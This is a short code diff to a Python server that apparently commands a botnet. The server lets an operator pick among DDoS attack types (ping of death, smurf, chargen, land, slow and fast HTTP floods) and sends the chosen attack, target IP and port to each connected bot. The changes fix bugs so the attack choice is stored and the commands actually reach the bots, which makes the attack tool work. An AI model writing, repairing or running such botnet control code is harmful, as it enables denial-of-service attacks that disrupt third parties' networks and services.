@@ -54,7 +54,7 @@ class Server:
                 else:
                     message = f"{self.attack}_{self.target_ip}_{self.target_port}"
 
-                self.socketfd.send(netbot.id, message.encode(), len(message),0)
+                netbot.id.sendall(message.encode())
 
     def close_connected_sockets(self):
         for netbot in self.netbots:
@@ -97,17 +97,17 @@ class Server:
                 continue
 
             if int_choice == 1:
-                attack = "POD"
+                self.attack = "POD"
             elif int_choice == 2:
-                attack = "SMURF"
+                self.attack = "SMURF"
             elif int_choice == 3:
-                attack = "CHARGEN"
+                self.attack = "CHARGEN"
             elif int_choice == 4:
-                attack = "LAND"
+                self.attack = "LAND"
             elif int_choice == 5:
-                attack = "SLOWHTTP"
+                self.attack = "SLOWHTTP"
             elif int_choice == 6:
-                attack = "FASTHTTP"
+                self.attack = "FASTHTTP"
             elif int_choice == 7:
                 break
             else:
@@ -130,7 +130,7 @@ class Server:
                         if netbot.id == i:
                             bot = netbot
                             self.netbots.remove(netbot)
-                            netbot -= 1
+                            # netbot -= 1
 
                     print(f"\nNetbot ({bot.address[0]} : {bot.address[1]}) disconnected.", flush=True)
 
